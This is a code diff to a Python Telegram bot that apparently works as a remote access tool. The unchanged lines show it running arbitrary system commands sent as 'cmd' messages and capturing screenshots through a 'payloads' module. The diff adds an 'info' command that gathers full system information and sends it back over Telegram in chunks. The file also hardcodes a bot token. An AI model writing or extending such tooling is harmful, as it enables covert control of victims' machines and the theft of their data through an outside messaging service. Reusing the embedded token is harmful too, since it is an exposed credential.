@@ -5,11 +5,37 @@ from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandl
 
 # Optional screenshot support for Linux & Windows
 from payloads.scrcap import capture_screen  # Must implement for your OS
-
+from payloads.info import get_all_system_info
 BOT_TOKEN = "7843150896:AAHpay0sUjwT2rclZ77PeO4yVRZLtbnb9nE"
 
 # Global current working dir
 cwd = os.getcwd()
+
+
+
+
+# Function to split message into chunks and send them
+async def send_large_message(update, message):
+    max_message_length = 4096  # Max length for a Telegram message
+    # Split the message into chunks if it's too long
+    for i in range(0, len(message), max_message_length):
+        chunk = message[i:i + max_message_length]
+        await update.message.reply_text(chunk)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 # /start command
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -22,7 +48,8 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "/start - Welcome message\n"
         "/help - Show this help\n"
         "cmd <command> - Run system command\n"
-        "scrcap - Capture screen"
+        "scrcap - Capture screen\n"
+        "info - get system info\n"
     )
 
 # Text message handler
@@ -36,6 +63,9 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("Goodbye or see ya 👋")
     elif msg.lower() == "use":
         await update.message.reply_text("I'm just a test bot 🤖")
+    elif msg.lower() == "info":
+        data_get_all_system_info = get_all_system_info()
+        await send_large_message(update, data_get_all_system_info)
     elif msg.lower() == "scrcap":
         try:
             path, name = capture_screen()
